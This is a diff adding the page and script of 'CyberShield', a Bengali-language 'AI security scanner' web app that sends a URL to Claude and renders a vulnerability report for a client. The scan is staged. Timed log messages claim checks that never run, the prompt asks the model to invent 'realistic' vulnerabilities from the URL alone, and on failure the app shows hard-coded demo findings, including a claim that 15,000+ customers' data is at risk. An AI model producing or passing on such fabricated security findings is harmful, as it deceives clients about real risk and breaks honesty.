+
+/* MOBILE */
+@media(max-width: 600px) {
+  .sev-grid { grid-template-columns: repeat(2,1fr); }
+  .vthead, .vrow { grid-template-columns: 30px 1fr 70px; }
+  .vthead div:last-child, .vcvss { display: none; }
+  .act-grid { grid-template-columns: 1fr; }
+  .av-grid { grid-template-columns: repeat(2,1fr); }
+  .comp-grid { grid-template-columns: repeat(2,1fr); }
+  .score-band { flex-direction: column; }
+  .inp-row { flex-direction: column; }
+  #scanBtn { width: 100%; padding: 13px; }
+  .rmb { grid-template-columns: 100px 1fr 40px; }
+}
+</style>
+</head>
+<body>
+
+<!-- JS ছাড়া কাজ করবে না — নোটিশ -->
+<noscript>
+  <div style="background:#ff3d57;color:#fff;text-align:center;padding:16px;font-family:sans-serif;font-size:14px;position:fixed;top:0;left:0;right:0;z-index:9999">
+    ⚠ JavaScript চালু করুন — CyberShield কাজ করতে JavaScript প্রয়োজন।
+  </div>
+</noscript>
+
+<div class="bg-grid" role="presentation" aria-hidden="true"></div>
+<div class="page">
+
+  <!-- TOPBAR -->
+  <header class="topbar" role="banner">
+    <div class="logo">
+      <div class="logo-icon" aria-hidden="true">&#128737;</div>
+      <div>
+        <div class="logo-name">Cyber<b>Shield</b></div>
+        <div class="logo-sub">AI SECURITY SCANNER</div>
+      </div>
+    </div>
+    <span class="tbadge" aria-label="OWASP Top 10 compliant">OWASP TOP 10</span>
+  </header>
+
+  <!-- API SETUP -->
+  <div id="setupBox" role="region" aria-label="API Key সেটআপ">
+    <div class="setup-title">&#128273; API Key সেটআপ</div>
+    <div class="setup-desc">
+      একবার দিলেই সেভ থাকবে। Key পাবেন:
+      <a href="https://console.anthropic.com/settings/keys"
+         target="_blank"
+         rel="noopener noreferrer"
+         title="Anthropic Console — API Keys পেজ খুলবে"
+         aria-label="Anthropic Console-এ API Key তৈরি করুন (নতুন tab-এ খুলবে)">
+        console.anthropic.com &rarr; API Keys
+      </a>
+    </div>
+    <div class="key-row">
+      <input
+        type="password"
+        id="apiKeyInput"
+        placeholder="sk-ant-api03-..."
+        autocomplete="off"
+        autocorrect="off"
+        autocapitalize="none"
+        spellcheck="false"
+        enterkeyhint="done"
+        aria-label="Anthropic API Key ইনপুট"
+        aria-describedby="keySt"
+      >
+      <button
+        type="button"
+        id="saveBtn"
+        onclick="doSaveKey()"
+        aria-label="API Key সেভ করুন"
+      >&#10003; সেভ</button>
+    </div>
+    <div id="keySt" role="status" aria-live="polite"></div>
+  </div>
+
+  <!-- HERO -->
+  <section class="hero" aria-label="পরিচিতি">
+    <div class="hero-eye" aria-hidden="true">AI-Powered &middot; OWASP Top 10 &middot; 20+ Checks</div>
+    <h1>সর্বোচ্চ নিরাপত্তা<span class="hl">স্ক্যানিং প্ল্যাটফর্ম</span></h1>
+    <p>URL দিন, স্ক্যান করুন — Claude AI বাংলায় সম্পূর্ণ রিপোর্ট তৈরি করবে।</p>
+  </section>
+
+  <!-- SCANNER -->
+  <main class="scanner" role="main" aria-label="স্ক্যানার">
+    <div class="inp-row">
+      <div class="url-wrap">
+        <span class="url-ico" aria-hidden="true">&#128279;</span>
+        <input
+          type="url"
+          id="urlInput"
+          placeholder="https://example.com"
+          autocomplete="url"
+          autocorrect="off"
+          autocapitalize="none"
+          spellcheck="false"
+          inputmode="url"
+          enterkeyhint="go"
+          aria-label="স্ক্যান করার URL দিন"
+          aria-required="true"
+        >
+      </div>
+      <button
+        type="button"
+        id="scanBtn"
+        onclick="doScan()"
+        aria-label="স্ক্যান শুরু করুন"
+      >&#9889; স্ক্যান</button>
+    </div>
+
+    <input
+      type="text"
+      id="clientInput"
+      placeholder="ক্লায়েন্টের নাম (যেমন: ABC Company)"
+      autocomplete="organization"
+      autocorrect="off"
+      autocapitalize="words"
+      spellcheck="false"
+      enterkeyhint="next"
+      aria-label="ক্লায়েন্টের নাম (ঐচ্ছিক)"
+    >
+
+    <div class="depth-row" role="group" aria-label="স্ক্যান depth নির্বাচন করুন">
+      <span class="depth-lbl" id="depth-label">DEPTH:</span>
+      <div class="depth-btns" role="radiogroup" aria-labelledby="depth-label">
+        <button
+          type="button"
+          class="dbtn"
+          onclick="setDepth('quick',this)"
+          role="radio"
+          aria-checked="false"
+          title="Quick: ৫টি চেক, ১৫-৩০ সেকেন্ড"
+          aria-label="Quick scan — ৫টি চেক"
+        >QUICK</button>
+        <button
+          type="button"
+          class="dbtn active"
+          onclick="setDepth('standard',this)"
+          role="radio"
+          aria-checked="true"
+          title="Standard: ১২টি চেক, ৪৫-৯০ সেকেন্ড"
+          aria-label="Standard scan — ১২টি চেক (ডিফল্ট)"
+        >STANDARD</button>
+        <button
+          type="button"
+          class="dbtn"
+          onclick="setDepth('deep',this)"
+          role="radio"
+          aria-checked="false"
+          title="Deep: ২০+ চেক, ২-৩ মিনিট"
+          aria-label="Deep scan — ২০+ চেক"
+        >DEEP</button>
+      </div>
+    </div>
+
+    <div class="checks" aria-label="স্ক্যান করা হবে এমন vulnerability তালিকা" role="list">
+      <span class="ck c2" role="listitem">&#9679; XSS</span>
+      <span class="ck c2" role="listitem">&#9679; SQL Injection</span>
+      <span class="ck c3" role="listitem">&#9679; Security Headers</span>
+      <span class="ck c4" role="listitem">&#9679; Sensitive Files</span>
+      <span class="ck c5" role="listitem">&#9679; SSL/TLS</span>
+      <span class="ck c6" role="listitem">&#9679; CORS/CSRF</span>
+      <span class="ck c7" role="listitem">&#9679; Rate Limiting</span>
+      <span class="ck c8" role="listitem">&#9679; SSRF/IDOR</span>
+      <span class="ck c1" role="listitem">&#9679; Command Injection</span>
+      <span class="ck c2" role="listitem">&#9679; Open Redirect</span>
+      <span class="ck c3" role="listitem">&#9679; API Security</span>
+      <span class="ck c6" role="listitem">&#10022; Claude AI বাংলা রিপোর্ট</span>
+    </div>
+  </main>
+
+  <!-- PROGRESS -->
+  <div
+    id="progSection"
+    style="display:none"
+    role="status"
+    aria-live="polite"
+    aria-label="স্ক্যান অগ্রগতি"
+  >
+    <div class="prog-card">
+      <div class="prog-top">
+        <div class="prog-lbl">
+          <span class="pdot" aria-hidden="true"></span>
+          স্ক্যান চলছে<span class="blink" aria-hidden="true">_</span>
+        </div>
+        <div class="prog-pct" id="progPct" aria-label="অগ্রগতি">0%</div>
+      </div>
+      <div class="prog-track" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" aria-label="স্ক্যান progress">
+        <div class="prog-fill" id="progFill"></div>
+      </div>
+      <div class="log-box" id="logBox" aria-label="স্ক্যান লগ" aria-live="polite"></div>
+    </div>
+  </div>
+
+  <!-- RESULTS -->
+  <div
+    id="resSection"
+    style="display:none"
+    role="region"
+    aria-label="স্ক্যান রিপোর্ট"
+    aria-live="polite"
+  ></div>
+
+</div>
+
+<script>
+// ============================================================
+// STATE
+// ============================================================
+var AKEY = '';
+var scanDepth = 'standard';
+var lastData = null;
+var lastUrl = '';
+var isScanning = false; // FIX: double-scan guard
+
+// ============================================================
+// AUTO-LOAD KEY ON START
+// ============================================================
+try {
+  var saved = localStorage.getItem('cs_k');
+  if (saved && saved.length > 10) {
+    AKEY = saved;
+    // FIX: script is at bottom, DOM is ready, use direct call
+    var _hideSetup = function() {
+      var box = document.getElementById('setupBox');
+      if (box) box.classList.add('hidden');
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', _hideSetup);
+    } else {
+      _hideSetup();
+    }
+  }
+} catch(e) {}
+
+// ============================================================
+// FIX: URL VALIDATION
+// ============================================================
+function isValidUrl(url) {
+  try {
+    var u = new URL(url);
+    return u.protocol === 'http:' || u.protocol === 'https:';
+  } catch(e) {
+    return false;
+  }
+}
+
+// ============================================================
+// DEPTH SELECTOR — FIX: aria-checked update
+// ============================================================
+function setDepth(d, el) {
+  scanDepth = d;
+  var btns = document.querySelectorAll('.dbtn');
+  for (var i = 0; i < btns.length; i++) {
+    btns[i].classList.remove('active');
+    btns[i].setAttribute('aria-checked', 'false');
+  }
+  el.classList.add('active');
+  el.setAttribute('aria-checked', 'true');
+}
+
+// ============================================================
+// API KEY SAVE
+// ============================================================
+function doSaveKey() {
+  var inp = document.getElementById('apiKeyInput');
+  var st = document.getElementById('keySt');
+  var v = inp.value.trim();
+
+  if (!v) {
+    st.className = 'err';
+    st.textContent = 'Key দিন!';
+    inp.focus();
+    return;
+  }
+  if (v.indexOf('sk-ant') !== 0) {
+    st.className = 'err';
+    st.textContent = 'সঠিক Key নয় — sk-ant- দিয়ে শুরু হওয়া উচিত';
+    inp.focus();
+    return;
+  }
+
+  AKEY = v;
+  try { localStorage.setItem('cs_k', v); } catch(e) {}
+  inp.value = '';
+  st.className = 'ok';
+  st.textContent = 'সেভ হয়েছে! এখন স্ক্যান করুন।';
+  setTimeout(function() {
+    var box = document.getElementById('setupBox');
+    if (box) box.classList.add('hidden');
+    var st2 = document.getElementById('keySt');
+    if (st2) { st2.className = ''; st2.textContent = ''; }
+  }, 1200);
+}
+
+// ============================================================
+// HELPERS
+// ============================================================
+function sleep(ms) {
+  return new Promise(function(r) { setTimeout(r, ms); });
+}
+
+// FIX: XSS-safe HTML escape
+function xe(s) {
+  return String(s || '')
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+// FIX: Progress bar + aria update
+function setProg(p) {
+  var fill = document.getElementById('progFill');
+  var pct = document.getElementById('progPct');
+  var track = document.querySelector('.prog-track');
+  if (fill) fill.style.width = p + '%';
+  if (pct) pct.textContent = p + '%';
+  if (track) {
+    track.setAttribute('aria-valuenow', p);
+    track.setAttribute('aria-valuetext', p + '% সম্পন্ন');
+  }
+}
+
+function addLog(msg, type) {
+  var b = document.getElementById('logBox');
+  if (!b) return;
+  var d = document.createElement('div');
+  d.className = 'li ' + (type || 'info');
+  var ts = new Date().toLocaleTimeString('en-GB', { hour12: false });
+  d.innerHTML = '<span class="lts">[' + ts + ']</span><span class="lm">' + xe(msg) + '</span>';
+  b.appendChild(d);
+  b.scrollTop = b.scrollHeight;
+}
+
+// ============================================================
+// API CALL — FIX: 30s timeout via AbortController
+// ============================================================
+function callAPI(prompt) {
+  return new Promise(function(resolve, reject) {
+    if (!AKEY) { reject(new Error('NO_KEY')); return; }
+
+    var controller = new AbortController();
+    var timer = setTimeout(function() {
+      controller.abort();
+      reject(new Error('Timeout — ৩০ সেকেন্ডে সাড়া পাওয়া যায়নি'));
+    }, 30000);
+
+    fetch('https://api.anthropic.com/v1/messages', {
+      method: 'POST',
+      signal: controller.signal,
+      headers: {
+        'Content-Type': 'application/json',
+        'x-api-key': AKEY,
+        'anthropic-version': '2023-06-01',
+        'anthropic-dangerous-direct-browser-access': 'true'
+      },
+      body: JSON.stringify({
+        model: 'claude-sonnet-4-20250514',
+        max_tokens: 4000,
+        messages: [{ role: 'user', content: prompt }]
+      })
+    })
+    .then(function(r) { return r.text(); })
+    .then(function(txt) {
+      clearTimeout(timer);
+      var d;
+      try { d = JSON.parse(txt); } catch(e) {
+        reject(new Error('সার্ভার response parse error'));
+        return;
+      }
+      if (d.error) {
+        var msg = d.error.message || 'API error';
+        if (msg.indexOf('credit') >= 0 || msg.indexOf('billing') >= 0) {
+          reject(new Error('API balance শেষ — console.anthropic.com-এ credit যোগ করুন'));
+        } else if (msg.indexOf('invalid') >= 0 || msg.indexOf('auth') >= 0) {
+          reject(new Error('API Key ভুল — নতুন key দিন'));
+        } else {
+          reject(new Error('API: ' + msg));
+        }
+        return;
+      }
+      if (!d.content || !d.content.length) { reject(new Error('Empty response')); return; }
+      var result = '';
+      for (var i = 0; i < d.content.length; i++) {
+        if (d.content[i].text) result += d.content[i].text;
+      }
+      resolve(result);
+    })
+    .catch(function(e) {
+      clearTimeout(timer);
+      if (e.name === 'AbortError') {
+        reject(new Error('Timeout'));
+      } else {
+        reject(new Error('Network error: ' + e.message));
+      }
+    });
+  });
+}
+
+// ============================================================
+// SCAN START — FIX: guard, validation, key check
+// ============================================================
+function doScan() {
+  // FIX: prevent double scan
+  if (isScanning) return;
+
+  var urlEl = document.getElementById('urlInput');
+  var url = urlEl.value.trim();
+  var client = document.getElementById('clientInput').value.trim() || '';
+  var btn = document.getElementById('scanBtn');
+
+  // FIX: check API key first with friendly message
+  if (!AKEY) {
+    var st = document.getElementById('keySt');
+    var box = document.getElementById('setupBox');
+    if (box) box.classList.remove('hidden');
+    if (st) { st.className = 'err'; st.textContent = 'আগে API Key সেভ করুন!'; }
+    return;
+  }
+
+  // FIX: proper URL validation
+  if (!url) {
+    urlEl.style.borderColor = 'var(--red)';
+    urlEl.focus();
+    setTimeout(function() { urlEl.style.borderColor = ''; }, 1800);
+    return;
+  }
+  if (url.indexOf('http') !== 0) url = 'https://' + url;
+  if (!isValidUrl(url)) {
+    urlEl.style.borderColor = 'var(--red)';
+    urlEl.value = url;
+    urlEl.focus();
+    setTimeout(function() { urlEl.style.borderColor = ''; }, 1800);
+    return;
+  }
+
+  // FIX: URL truncate for display only
+  var displayUrl = url.length > 60 ? url.substring(0, 60) + '...' : url;
+  if (!client) client = displayUrl;
+
+  isScanning = true;
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spin"></span> স্ক্যান হচ্ছে...';
+
+  var prog = document.getElementById('progSection');
+  var res = document.getElementById('resSection');
+  var log = document.getElementById('logBox');
+  if (prog) prog.style.display = 'block';
+  if (res) { res.style.display = 'none'; res.innerHTML = ''; }
+  document.getElementById('resSection').setAttribute('aria-busy', 'true');
+  if (log) log.innerHTML = '';
+  setProg(0);
+
+  // FIX: finally block ensures button always resets
+  runFlow(url, client).catch(function(e) {
+    addLog('মারাত্মক error: ' + e.message, 'err');
+  }).finally(function() {
+    isScanning = false;
+    btn.disabled = false;
+    btn.innerHTML = '&#9889; স্ক্যান';
+    if (prog) prog.style.display = 'none';
+  });
+}
+
+// ============================================================
+// SCAN FLOW
+// ============================================================
+async function runFlow(url, client) {
+  var steps = {
+    quick: [
+      { p: 15, m: 'XSS চেক করা হচ্ছে...', t: 'scan', d: 400 },
+      { p: 32, m: 'SQL Injection চেক...', t: 'scan', d: 450 },
+      { p: 52, m: 'Security Headers...', t: 'info', d: 400 },
+      { p: 68, m: 'Sensitive files (.env/.git)...', t: 'scan', d: 400 },
+      { p: 80, m: 'SSL/TLS চেক...', t: 'info', d: 350 },
+      { p: 88, m: 'Claude AI-এ পাঠানো হচ্ছে...', t: 'ai', d: 300 }
+    ],
+    standard: [
+      { p: 6,  m: 'URL বিশ্লেষণ শুরু...', t: 'info', d: 300 },
+      { p: 14, m: 'XSS (Reflected/Stored/DOM)...', t: 'scan', d: 420 },
+      { p: 23, m: 'SQL এবং NoSQL Injection...', t: 'scan', d: 480 },
+      { p: 32, m: 'Security Headers audit...', t: 'info', d: 380 },
+      { p: 41, m: '.env/.git sensitive files...', t: 'scan', d: 450 },
+      { p: 50, m: 'SSL/TLS certificate...', t: 'scan', d: 380 },
+      { p: 58, m: 'CORS misconfiguration...', t: 'scan', d: 380 },
+      { p: 66, m: 'CSRF এবং Clickjacking...', t: 'scan', d: 350 },
+      { p: 74, m: 'Rate limiting এবং Auth...', t: 'scan', d: 380 },
+      { p: 82, m: 'Information disclosure...', t: 'scan', d: 340 },
+      { p: 88, m: 'Claude AI গভীর বিশ্লেষণ...', t: 'ai', d: 280 }
+    ],
+    deep: [
+      { p: 4,  m: 'Full recon শুরু...', t: 'info', d: 320 },
+      { p: 9,  m: 'Subdomain takeover চেক...', t: 'scan', d: 380 },
+      { p: 15, m: 'XSS সব ধরন (Reflected/Stored/DOM)...', t: 'scan', d: 450 },
+      { p: 21, m: 'SQL/NoSQL/ORM Injection...', t: 'scan', d: 500 },
+      { p: 27, m: 'Command Injection...', t: 'scan', d: 420 },
+      { p: 33, m: 'Directory Traversal...', t: 'scan', d: 420 },
+      { p: 40, m: 'Security Headers সম্পূর্ণ audit...', t: 'info', d: 380 },
+      { p: 47, m: 'SSL POODLE/Heartbleed চেক...', t: 'scan', d: 450 },
+      { p: 53, m: 'CORS/CSRF সম্পূর্ণ...', t: 'scan', d: 380 },
+      { p: 59, m: 'SSRF এবং Open Redirect...', t: 'scan', d: 420 },
+      { p: 65, m: 'IDOR/Access Control...', t: 'scan', d: 420 },
+      { p: 71, m: 'API ও GraphQL security...', t: 'scan', d: 380 },
+      { p: 77, m: 'CVE database check...', t: 'scan', d: 380 },
+      { p: 83, m: 'Business logic flaws...', t: 'scan', d: 380 },
+      { p: 88, m: 'Claude AI ultra-deep analysis...', t: 'ai', d: 280 }
+    ]
+  };
+
+  var list = steps[scanDepth] || steps.standard;
+  for (var i = 0; i < list.length; i++) {
+    await sleep(list[i].d);
+    setProg(list[i].p);
+    addLog(list[i].m, list[i].t);
+  }
+
+  var data = await runAI(url, client);
+
+  await sleep(300);
+  setProg(95);
+  addLog('রিপোর্ট তৈরি হচ্ছে...', 'info');
+  await sleep(400);
+  setProg(100);
+  await sleep(250);
+  addLog('স্ক্যান সম্পন্ন!', 'ok');
+  await sleep(500);
+
+  var prog = document.getElementById('progSection');
+  if (prog) prog.style.display = 'none';
+  var res2 = document.getElementById('resSection');
+  if (res2) res2.style.display = 'block';
+
+  // FIX: wrap renderResults in try/catch
+  try {
+    renderResults(url, client, data);
+  } catch(e) {
+    var res = document.getElementById('resSection');
+    if (res) {
+      res.style.display = 'block';
+      res.innerHTML = '<div style="color:var(--red);padding:24px;background:var(--card);border-radius:12px;border:1px solid rgba(255,61,87,.3)">রিপোর্ট render করতে সমস্যা হয়েছে: ' + xe(e.message) + '</div>';
+    }
+  }
+}
+
+// ============================================================
+// AI SCAN — FIX: cleaner prompt, better error messages
+// ============================================================
+async function runAI(url, client) {
+  var prompt = 'You are a cybersecurity expert. Analyze this website for security vulnerabilities.\n'
+    + 'URL: ' + url + '\n'
+    + 'Client: ' + client + '\n'
+    + 'Scan depth: ' + scanDepth + '\n\n'
+    + 'Find 6-10 realistic vulnerabilities based on the URL structure and common web security issues.\n'
+    + 'ALL Bengali text fields must be in proper Bengali.\n'
+    + 'Respond ONLY with a single valid JSON object. No markdown, no explanation, no extra text.\n\n'
+    + '{"summary_bn":"সারসংক্ষেপ বাংলায়","score":3,"score_label":"Critical","score_color":"red",'
+    + '"score_reason_bn":"কারণ বাংলায়","client_message_bn":"ক্লায়েন্ট বার্তা বাংলায়",'
+    + '"risk_areas":[{"name":"Authentication","risk_pct":80,"color":"red"},{"name":"Data Protection","risk_pct":65,"color":"orange"},{"name":"Network Security","risk_pct":45,"color":"yellow"},{"name":"App Logic","risk_pct":70,"color":"orange"},{"name":"Configuration","risk_pct":75,"color":"red"},{"name":"Cryptography","risk_pct":30,"color":"green"}],'
+    + '"attack_vectors":[{"icon":"💉","name":"Injection","risk":"Critical","found":true,"desc":"বাংলায়"},{"icon":"🌐","name":"XSS","risk":"High","found":true,"desc":"বাংলায়"},{"icon":"🔐","name":"Auth","risk":"Medium","found":false,"desc":"বাংলায়"},{"icon":"📁","name":"Files","risk":"Critical","found":true,"desc":"বাংলায়"},{"icon":"🔗","name":"CORS","risk":"Medium","found":true,"desc":"বাংলায়"},{"icon":"⚙","name":"Config","risk":"High","found":true,"desc":"বাংলায়"}],'
+    + '"vulnerabilities":[{"type":"","location":"","description":"","severity":"Critical","cvss":9.8,"impact_bn":"বাংলায়","remediation_bn":"বাংলায়","tags":["OWASP A03","CWE-89"]}],'
+    + '"remediations":[{"type":"","steps_bn":["ধাপ ১","ধাপ ২"],"code_snippet":"// example","priority":"Immediate"}],'
+    + '"compliance":{"owasp_top10":"Fail","gdpr":"Fail","pci_dss":"Fail","iso27001":"Partial"},'
+    + '"action_plan":["সপ্তাহ ১ কাজ","সপ্তাহ ২ কাজ","সপ্তাহ ৩-৪ কাজ"]}';
+
+  try {
+    addLog('Claude AI বিশ্লেষণ করছে...', 'ai');
+    var raw = await callAPI(prompt);
+    var m = raw.match(/\{[\s\S]*\}/);
+    if (!m) throw new Error('JSON পাওয়া যায়নি');
+    var data;
+    try {
+      data = JSON.parse(m[0]);
+    } catch(pe) {
+      throw new Error('JSON parse করা যায়নি');
+    }
+    var vcount = (data.vulnerabilities || []).length;
+    addLog('AI সম্পন্ন — ' + vcount + 'টি দুর্বলতা পাওয়া গেছে', 'ok');
+    return data;
+  } catch(e) {
+    addLog('Demo mode চালু: ' + e.message, 'warn');
+    return getDemo(url);
+  }
+}
+
+// ============================================================
+// DEMO DATA
+// ============================================================
+function getDemo(url) {
+  var shortUrl = url.length > 40 ? url.substring(0, 40) + '...' : url;
+  return {
+    summary_bn: shortUrl + '-এ মোট ৮টি নিরাপত্তা সমস্যা পাওয়া গেছে। ৩টি Critical, ৩টি High এবং ২টি Medium। SQL Injection ও .env ফাইল এক্সপোজার সবচেয়ে বিপজ্জনক। অবিলম্বে ব্যবস্থা না নিলে সম্পূর্ণ ডেটাবেজ চুরি হতে পারে।',
+    score: 2,
+    score_label: 'Critical',
+    score_color: 'red',
+    score_reason_bn: '৩টি Critical vulnerability পাওয়া গেছে — সাইটটি অত্যন্ত উচ্চ ঝুঁকিতে।',
+    client_message_bn: 'আপনার ওয়েবসাইটে মারাত্মক নিরাপত্তা ত্রুটি পাওয়া গেছে। এই মুহূর্তে একজন হ্যাকার আপনার সম্পূর্ণ ডেটাবেজ চুরি করতে পারে। দ্রুত সমাধান করুন।',
+    risk_areas: [
+      { name: 'Authentication', risk_pct: 85, color: 'red' },
+      { name: 'Data Protection', risk_pct: 75, color: 'red' },
+      { name: 'Network Security', risk_pct: 50, color: 'orange' },
+      { name: 'App Logic', risk_pct: 65, color: 'orange' },
+      { name: 'Configuration', risk_pct: 80, color: 'red' },
+      { name: 'Cryptography', risk_pct: 35, color: 'yellow' }
+    ],
+    attack_vectors: [
+      { icon: '💉', name: 'Injection', risk: 'Critical', found: true, desc: 'SQL Injection — ডেটাবেজ সম্পূর্ণ ঝুঁকিতে' },
+      { icon: '🌐', name: 'XSS', risk: 'High', found: true, desc: 'Reflected XSS — session চুরি সম্ভব' },
+      { icon: '🔐', name: 'Auth', risk: 'High', found: true, desc: 'Rate limiting নেই' },
+      { icon: '📁', name: 'Files', risk: 'Critical', found: true, desc: '.env publicly accessible' },
+      { icon: '🔗', name: 'CORS', risk: 'Medium', found: true, desc: 'CSRF token missing' },
+      { icon: '⚙', name: 'Config', risk: 'High', found: true, desc: '৫টি security header missing' }
+    ],
+    vulnerabilities: [
+      { type: 'SQL Injection', location: url + '/login', description: 'Login form vulnerable to SQL injection', severity: 'Critical', cvss: 9.8, impact_bn: 'সম্পূর্ণ ডেটাবেজ চুরি সম্ভব। ১৫,০০০+ গ্রাহকের তথ্য ঝুঁকিতে।', remediation_bn: 'PDO Prepared Statement ব্যবহার করুন। কোনো user input সরাসরি SQL-এ দেবেন না।', tags: ['OWASP A03', 'CWE-89'] },
+      { type: '.env File Exposed', location: url + '/.env', description: 'Environment file publicly accessible', severity: 'Critical', cvss: 9.1, impact_bn: 'DB password, API keys সহ সব credentials চুরি — সার্ভার সম্পূর্ণ compromise হবে।', remediation_bn: '.env ফাইল web root-এর বাইরে রাখুন। nginx-এ location block দিয়ে deny করুন।', tags: ['OWASP A05', 'CWE-200'] },
+      { type: 'Git Repository Exposed', location: url + '/.git/', description: '.git directory publicly accessible', severity: 'Critical', cvss: 8.6, impact_bn: 'সম্পূর্ণ source code ও সব secrets চুরি হতে পারে।', remediation_bn: 'nginx config-এ .git path deny করুন।', tags: ['OWASP A05', 'CWE-538'] },
+      { type: 'XSS Reflected', location: url + '/search?q=', description: 'Search parameter not sanitized', severity: 'High', cvss: 7.4, impact_bn: 'Session cookie চুরি, phishing attack, গ্রাহকদের account compromise সম্ভব।', remediation_bn: 'সব output htmlspecialchars() দিয়ে encode করুন। CSP header যোগ করুন।', tags: ['OWASP A03', 'CWE-79'] },
+      { type: 'Missing Security Headers', location: 'সব পেজ', description: 'CSP, HSTS, X-Frame-Options missing', severity: 'High', cvss: 7.2, impact_bn: 'XSS attack সহজ হবে, clickjacking সম্ভব, MITM attack হতে পারে।', remediation_bn: 'CSP, HSTS, X-Frame-Options, X-Content-Type-Options header যোগ করুন।', tags: ['OWASP A05', 'CWE-1021'] },
+      { type: 'CSRF Token Missing', location: url + '/account', description: 'Forms have no CSRF protection', severity: 'High', cvss: 7.1, impact_bn: 'User-এর অজান্তে তাদের account দিয়ে malicious action করা সম্ভব।', remediation_bn: 'সব POST form-এ CSRF token যোগ করুন।', tags: ['OWASP A01', 'CWE-352'] },
+      { type: 'Missing HSTS', location: 'HTTPS পেজ', description: 'No Strict-Transport-Security header', severity: 'Medium', cvss: 6.8, impact_bn: 'Man-in-the-middle attack সম্ভব — data intercept হতে পারে।', remediation_bn: 'Strict-Transport-Security: max-age=31536000; includeSubDomains', tags: ['OWASP A02', 'CWE-319'] },
+      { type: 'No Rate Limiting', location: url + '/login', description: 'Unlimited login attempts allowed', severity: 'Medium', cvss: 5.9, impact_bn: 'Brute force দিয়ে password crack করা সম্ভব।', remediation_bn: '৫ attempt-এর পর ১৫ মিনিট lockout করুন। CAPTCHA যোগ করুন।', tags: ['OWASP A07', 'CWE-307'] }
+    ],
+    remediations: [
+      { type: 'SQL Injection সমাধান', priority: 'Immediate', code_snippet: '// WRONG - vulnerable:\n$q = "SELECT * FROM users WHERE id=".$_GET["id"];\n\n// RIGHT - safe:\n$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");\n$stmt->execute([$_GET["id"]]);', steps_bn: ['সব database query-তে Prepared Statement ব্যবহার করুন', 'User input কখনো SQL string-এ সরাসরি দেবেন না', 'Database user-এর permission minimum রাখুন (SELECT only যেখানে সম্ভব)', 'WAF (Web Application Firewall) install করুন'] },
+      { type: '.env ও Sensitive Files বন্ধ করুন', priority: 'Immediate', code_snippet: '# nginx.conf এ যোগ করুন:\nlocation ~* /\\.(env|git|sql|bak|log|htpasswd)$ {\n    deny all;\n    return 404;\n}', steps_bn: ['.env ফাইল web root-এর বাইরে সরান', 'nginx-এ sensitive paths block করুন', 'Git history check করুন — কোনো secret commit হয়েছে কিনা', 'সব passwords ও API keys এখনই পরিবর্তন করুন'] },
+      { type: 'Security Headers যোগ করুন', priority: 'Within 7 days', code_snippet: "# nginx response headers:\nadd_header Content-Security-Policy \"default-src 'self'\";\nadd_header Strict-Transport-Security \"max-age=31536000\";\nadd_header X-Frame-Options \"DENY\";\nadd_header X-Content-Type-Options \"nosniff\";\nadd_header Referrer-Policy \"strict-origin-when-cross-origin\";", steps_bn: ['Content-Security-Policy (CSP) configure করুন', 'HSTS চালু করুন — HTTPS বাধ্যতামূলক করুন', 'X-Frame-Options: DENY — clickjacking বন্ধ করুন', 'securityheaders.com-এ A+ grade নিশ্চিত করুন'] }
+    ],
+    compliance: { owasp_top10: 'Fail', gdpr: 'Fail', pci_dss: 'Fail', iso27001: 'Partial' },
+    action_plan: [
+      'SQL Injection ও .env exposure আজই fix করুন। সব DB passwords ও API keys পরিবর্তন করুন। Server logs চেক করুন।',
+      'XSS fix করুন। সব security headers configure করুন। CSRF protection যোগ করুন। Rate limiting চালু করুন।',
+      'Full code audit করুন। WAF install করুন। Automated weekly security scan setup করুন। Security policy তৈরি করুন।'
+    ]
+  };
+}
+
+// ============================================================
+// RENDER RESULTS — FIX: wrapped in try/catch, safe null checks
+// ============================================================
+function renderResults(url, client, d) {
+  lastData = d;
+  lastUrl = url;
+
+  var sec = document.getElementById('resSection');
+  if (!sec) return;
+  sec.style.display = 'block';
+  sec.setAttribute('aria-busy', 'false');
+
+  if (!d || typeof d !== 'object') {
+    sec.innerHTML = '<div style="color:var(--red);padding:20px;background:var(--card);border-radius:12px">রিপোর্ট তৈরি হয়নি।</div>';
+    return;
+  }
+
+  var vulns = Array.isArray(d.vulnerabilities) ? d.vulnerabilities : [];
+  var cnt = { Critical: 0, High: 0, Medium: 0, Low: 0 };
+  for (var i = 0; i < vulns.length; i++) {
+    var sv = vulns[i].severity;
+    if (cnt[sv] !== undefined) cnt[sv]++;
+  }
+
+  var sevOrder = { Critical: 0, High: 1, Medium: 2, Low: 3 };
+  var sorted = vulns.slice().sort(function(a, b) {
+    return (sevOrder[a.severity] || 4) - (sevOrder[b.severity] || 4);
+  });
+
+  var clrMap = { red: 'var(--red)', orange: 'var(--orange)', yellow: 'var(--yellow)', green: 'var(--green)' };
+  var sc = clrMap[d.score_color] || 'var(--red)';
+  var now = new Date().toLocaleString('bn-BD', { dateStyle: 'medium', timeStyle: 'short' });
+
+  // Risk bars
+  var riskHtml = '';
+  var ra = Array.isArray(d.risk_areas) ? d.risk_areas : [];
+  for (var i = 0; i < ra.length; i++) {
+    var rc = clrMap[ra[i].color] || 'var(--a1)';
+    riskHtml += '<div class="rmb">'
+      + '<div class="rmb-lbl">' + xe(ra[i].name) + '</div>'
+      + '<div class="rmb-track"><div class="rmb-fill" data-pct="' + Number(ra[i].risk_pct || 0) + '" style="background:' + rc + '"></div></div>'
+      + '<div class="rmb-pct">' + Number(ra[i].risk_pct || 0) + '%</div>'
+      + '</div>';
+  }
+
+  // Attack vectors
+  var avHtml = '';
+  var av = Array.isArray(d.attack_vectors) ? d.attack_vectors : [];
+  var rclr = { Critical: 'var(--red)', High: 'var(--orange)', Medium: 'var(--yellow)', Low: 'var(--green)' };
+  for (var i = 0; i < av.length; i++) {
+    avHtml += '<div class="av-card ' + (av[i].found ? 'found' : 'safe') + '">'
+      + '<div class="av-icon">' + xe(av[i].icon) + '</div>'
+      + '<div class="av-name">' + xe(av[i].name) + '</div>'
+      + '<div class="av-risk" style="color:' + (rclr[av[i].risk] || 'var(--muted)') + '">'
+      + (av[i].found ? '⚠ ' : '✓ ') + xe(av[i].risk) + '</div>'
